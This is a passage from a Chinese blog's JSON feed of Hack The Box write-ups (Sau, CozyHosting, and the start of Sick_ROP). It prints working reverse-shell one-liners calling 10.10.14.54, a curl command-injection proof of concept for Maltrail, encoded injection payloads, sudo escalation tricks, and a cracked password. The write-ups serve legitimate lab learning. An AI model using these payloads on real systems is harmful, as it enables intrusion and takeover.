&quot;http://127.0.0.1:80/&quot;,</span><br><span class=\"line\">  &quot;proxy_response&quot;: true,</span><br><span class=\"line\">  &quot;insecure_tls&quot;: false,</span><br><span class=\"line\">  &quot;expand_path&quot;: true,</span><br><span class=\"line\">  &quot;capacity&quot;: 250</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这样的话访问路由 add 就相当于访问 http://127.0.0.1:80，接下来访问 add 端口后对其进行目录扫描</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wfuzz -w &quot;D:\\wordlist\\directoryDicts\\Filenames_or_Directories_All.txt&quot; --hc 404,502 http://10.10.11.224:55555/add/FUZZ</span><br></pre></td></tr></table></figure></p>\n<p>扫描了一些发现已经扫描到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000132:   200        2 L      4 W        26 Ch       &quot;robots.txt&quot;</span><br><span class=\"line\">000000240:   200        73 L     276 W      15051 Ch    &quot;favicon.ico&quot;</span><br><span class=\"line\">000000311:   200        111 L    432 W      7091 Ch     &quot;index&quot;</span><br><span class=\"line\">000000252:   401        0 L      2 W        12 Ch       &quot;login&quot;</span><br><span class=\"line\">000001986:   401        0 L      0 W        0 Ch        &quot;events&quot;</span><br><span class=\"line\">000005704:   200        0 L      1 W        4 Ch        &quot;ping&quot;</span><br></pre></td></tr></table></figure></p>\n<p>接下来一个一个查看路由，index 下提示了这个使用的什么服务</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Powered by Maltrail (v0.53)</span><br><span class=\"line\">Hide threat</span><br><span class=\"line\">Report false positive</span><br></pre></td></tr></table></figure></p>\n<p>去网上找找这个服务的漏洞</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">maltrail是开源的恶意流量检测系统，项目地址：https://github.com/stamparm/maltrail。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>查到了这个项目的漏洞了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">描述</span><br><span class=\"line\">Maltrail &lt;= v0.54 在登录过程中容易受到未经身份验证的操作系统命令注入的影响。</span><br><span class=\"line\"></span><br><span class=\"line\">总结</span><br><span class=\"line\">mailtrail/core/http.py 中的函数在参数中包含命令注入漏洞。subprocess.check_outputparams.get(&quot;username&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">攻击者可以通过将任意操作系统命令注入 username 参数来利用此漏洞。注入的命令将以正在运行的进程的权限执行。此漏洞无需身份验证即可远程利用。</span><br><span class=\"line\"></span><br><span class=\"line\">概念验证</span><br><span class=\"line\">curl &#x27;http://hostname:8338/login&#x27; \\</span><br><span class=\"line\">  --data &#x27;username=;`id &gt; /tmp/bbq`&#x27;</span><br><span class=\"line\">冲击</span><br><span class=\"line\">任意命令执行</span><br></pre></td></tr></table></figure></p>\n<p>也就是说在 login 页面发送 username=;`` 就能任意命令执行</p>\n<p>虽然能够执行命令但是无法直接回显出内容很操作</p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>直接反弹 shell</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>\n<p>使用 urlencode</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%62%61%73%68%24%7b%49%46%53%7d%2d%69%24%7b%49%46%53%7d%3e%26%24%7b%49%46%53%7d%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%35%34%2f%39%39%39%39%24%7b%49%46%53%7d%30%3e%26%31</span><br></pre></td></tr></table></figure></p>\n<p>发现反弹不上去</p>\n<p>使用获取反弹试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">本地写一个shell.sh然后在使用python -m http.server</span><br><span class=\"line\">相当于本地开启了8000端口</span><br><span class=\"line\">`curl 10.10.14.54:8000/shell.sh|bash`</span><br></pre></td></tr></table></figure></p>\n<p>不晓得为什么不行</p>\n<p>那直接使用其他的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><br><span class=\"line\">&quot;10.10.14.54&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">curl &#x27;http://10.10.11.224:55555/add/login&#x27; --data &#x27;username=;`echo &quot;cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoCiIxMC4xMC4xNC41NCIsOTk5OSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJw==&quot;|base64 -d|sh`&#x27;</span><br></pre></td></tr></table></figure></p>\n<p>反弹成功</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">listening on [any] 9999 ...</span><br><span class=\"line\">connect to [10.10.14.54] from (UNKNOWN) [10.10.11.224] 37542</span><br><span class=\"line\">puma@sau:/opt/maltrail$ ls</span><br></pre></td></tr></table></figure></p>\n<p>在 puma 的目录下就有一个 flag</p>\n<h4 id=\"提取\"><a class=\"anchor\" href=\"#提取\">#</a> 提取</h4>\n<p>使用 sudo -l</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Matching Defaults entries for puma on sau:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User puma may run the following commands on sau:</span><br><span class=\"line\">    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</span><br></pre></td></tr></table></figure></p>\n<p>提示能执行 systemctl</p>\n<p>那好办了</p>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://gtfobins.github.io/gtfobins/systemctl/</span><br></pre></td></tr></table></figure></p>\n<p>直接照搬 exp 的话可能需要你输入 puma 的密码这个时候就只有使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo /usr/bin/systemctl status trail.service</span><br><span class=\"line\">!sh</span><br></pre></td></tr></table></figure></p>\n<p>因为上面现在不需要密码的只有</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</span><br></pre></td></tr></table></figure></p>\n<p>然后在 root 目录下得到 flag2</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-CozyHosting/",
            "url": "https://lookhui.github.io/HTB-CozyHosting/",
            "title": "HTB-CozyHosting",
            "date_published": "2023-12-13T11:29:44.000Z",
            "content_html": "<h1 id=\"cozyhosting\"><a class=\"anchor\" href=\"#cozyhosting\">#</a> CozyHosting</h1>\n<p>nmap 扫描靶机</p>\n<p>同时访问靶机</p>\n<p>url 变成了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://cozyhosting.htb/</span><br></pre></td></tr></table></figure></p>\n<p>这个时候把这个域名加到 hosts</p>\n<p>如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.230 cozyhosting.htb</span><br></pre></td></tr></table></figure></p>\n<p>使用 nmap 普通扫描扫描内容如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 19:38 中国标准时间</span><br><span class=\"line\">Nmap scan report for cozyhosting.htb (10.10.11.230)</span><br><span class=\"line\">Host is up (0.34s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds</span><br></pre></td></tr></table></figure></p>\n<p>先从 80 端口下手</p>\n<p>先扫描目录</p>\n<p>目录扫描扫描到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000022:   401        0 L      1 W        97 Ch       &quot;admin&quot;</span><br><span class=\"line\">000000251:   200        96 L     196 W      4431 Ch     &quot;login&quot;</span><br><span class=\"line\">000000314:   500        0 L      1 W        73 Ch       &quot;error&quot;</span><br><span class=\"line\">000000310:   200        284 L    745 W      12706 Ch    &quot;index&quot;</span><br><span class=\"line\">000013836:   204        0 L      0 W        0 Ch        &quot;logout&quot;</span><br><span class=\"line\">000017286:   400        0 L      32 W       431 Ch      &quot;system\\&quot;</span><br></pre></td></tr></table></figure></p>\n<p>访问 error 报错爆的是 java 的 spring boot 框架的错误，使用专门扫路由的字典扫描到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">actuator</span><br></pre></td></tr></table></figure></p>\n<p>访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://cozyhosting.htb/actuator</span><br></pre></td></tr></table></figure></p>\n<p>查看到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;_links&quot;: &#123;</span><br><span class=\"line\">    &quot;self&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;sessions&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/sessions&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;beans&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/beans&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;health&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/health&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;health-path&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/health/&#123;*path&#125;&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: true</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;env&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/env&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;env-toMatch&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/env/&#123;toMatch&#125;&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: true</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;mappings&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/mappings&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>访问 sessions 路由得到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;3FFF49C67E9B7FE5A7B867EA4AF08D00&quot;: &quot;kanderson&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个应该是 JSESSIONID</p>\n<p>也就是 cookie 以这个 jsessionid 去访问 admin 路由</p>\n<p>然后进去 admin 网页后能看到这个 ssh 的连接方式，我们使用 ' 能够测试出这个的报错</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Location: http://cozyhosting.htb/admin?error=</span><br><span class=\"line\">/bin/bash: -c: line 1: unexpected EOF while looking for matching `&#x27;&#x27;</span><br><span class=\"line\">/bin/bash: -c: line 2: syntax error: unexpected end of file</span><br></pre></td></tr></table></figure></p>\n<p>这样的话我们试试反弹 shell</p>\n<p>尝试了直接反弹发现没有一点反应那就</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1&quot;|base64</span><br><span class=\"line\">得到base64</span><br><span class=\"line\">然后在构造解码</span><br><span class=\"line\">;echo$&#123;IFS&#125;&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NC85OTk5IDA+JjEK&quot;|base64$&#123;IFS&#125;-d|$&#123;IFS&#125;bash;</span><br><span class=\"line\">直接上传发现还是不行，那就使用url加密一下如</span><br><span class=\"line\">%3b%65%63%68%6f%24%7b%49%46%53%7d%22%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%31%4e%43%38%35%4f%54%6b%35%49%44%41%2b%4a%6a%45%4b%22%7c%62%61%73%65%36%34%24%7b%49%46%53%7d%2d%64%7c%24%7b%49%46%53%7d%62%61%73%68%3b</span><br></pre></td></tr></table></figure></p>\n<p>然后本地开启监听</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 9999</span><br></pre></td></tr></table></figure></p>\n<p>反弹成功，</p>\n<p>ls 看到 app 下面的 jar 包</p>\n<p>然后在通过 nc 或者 python 从上面把这个 jar 包下载到本地进行分析</p>\n<p>在看看用户执行 cat /etc/passwd</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class=\"line\">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class=\"line\">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class=\"line\">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class=\"line\">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class=\"line\">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class=\"line\">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class=\"line\">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class=\"line\">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class=\"line\">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class=\"line\">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class=\"line\">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class=\"line\">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class=\"line\">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class=\"line\">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class=\"line\">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class=\"line\">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">messagebus:x:103:104::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">pollinate:x:105:1::/var/cache/pollinate:/bin/false</span><br><span class=\"line\">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class=\"line\">syslog:x:107:113::/home/syslog:/usr/sbin/nologin</span><br><span class=\"line\">uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin</span><br><span class=\"line\">tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class=\"line\">landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin</span><br><span class=\"line\">fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class=\"line\">lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class=\"line\">app:x:1001:1001::/home/app:/bin/sh</span><br><span class=\"line\">postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class=\"line\">josh:x:1003:1003::/home/josh:/usr/bin/bash</span><br><span class=\"line\">_laurel:x:998:998::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure></p>\n<p>这种渗透我们一定要注意的是这些有 /bin/sh 的也就是能够执行命令的用户</p>\n<p>如 josh 和 postgres 以及 app</p>\n<p>下载好后直接通过 jd-gui 来直接进行反编译分析</p>\n<p>通过查看 application.properties 得到了 PostgreSQL 数据库账号以及密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psql -h 127.0.0.1 -U postgres</span><br></pre></td></tr></table></figure></p>\n<p>这个数据库使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\c cozyhosting</span><br><span class=\"line\"></span><br><span class=\"line\">\\d</span><br><span class=\"line\">select * from users;</span><br></pre></td></tr></table></figure></p>\n<p>得到密码的 hash 值</p>\n<p>通过非常牛逼的 join 来对 hash 值进行破解</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ john ./admin.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class=\"line\">Cost 1 (iteration count) is 1024 for all loaded hashes</span><br><span class=\"line\">Will run 16 OpenMP threads</span><br><span class=\"line\">Proceeding with single, rules:Single</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class=\"line\">Proceeding with wordlist:/usr/share/john/password.lst</span><br></pre></td></tr></table></figure></p>\n<p>通过 john 解出密码为</p>\n<p>manchesterunited</p>\n<p>我们去尝试使用 josh 去 ssh 登录</p>\n<p>发现登录成功并且在目录下还有一个 user.txt 这个就是我们的第一个 flag</p>\n<p>尝试提取</p>\n<p>sudo -l</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Matching Defaults entries for josh on localhost:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,</span><br><span class=\"line\">    use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User josh may run the following commands on localhost:</span><br><span class=\"line\">    (root) /usr/bin/ssh *</span><br></pre></td></tr></table></figure></p>\n<p>发现竟然能调动 root 的 /usr/bin/ssh</p>\n<p>那好办多了</p>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://gtfobins.github.io/gtfobins/ssh/#sudo</span><br></pre></td></tr></table></figure></p>\n<p>使用了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x</span><br></pre></td></tr></table></figure></p>\n<p>输入密码得到 flag2</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Sick-ROP/",
            "url": "https://lookhui.github.io/HTB-Sick-ROP/",
            "title": "HTB-Sick_ROP",
            "date_published": "2023-12-13T11:04:07.000Z",
            "content_html": "<h1 id=\"sick-rop\"><a class=\"anchor\" href=\"#sick-rop\">#</a> Sick ROP</h1>\n<p>常规套路检查</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     amd64-64-little</span><br><span class=\"line\">RELRO:    No RELRO</span><br><span class=\"line\">Stack:    No canary found</span><br><span class=\"line\">NX:       NX enabled</span><br><span class=\"line\">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>\n<p>使用 strings</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop.asm</span><br><span class=\"line\">read</span><br><span class=\"line\">write</span><br><span class=\"line\">vuln</span><br><span class=\"line\">__bss_start</span><br><span class=\"line\">_edata</span><br><span class=\"line\">_end</span><br><span class=\"line\">.symtab</span><br><span class=\"line\">.strtab</span><br><span class=\"line\">.shstrtab</span><br><span class=\"line\">.text</span><br></pre></td></tr></table></figure></p>\n<p>发现貌似没有什么可利用的点</p>\n<p>本地运行调试发现我输出什么他就会照样输出</p>\n<p>是静态的话我们使用 ROPgadget --binary sick_rop --ropchain</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span 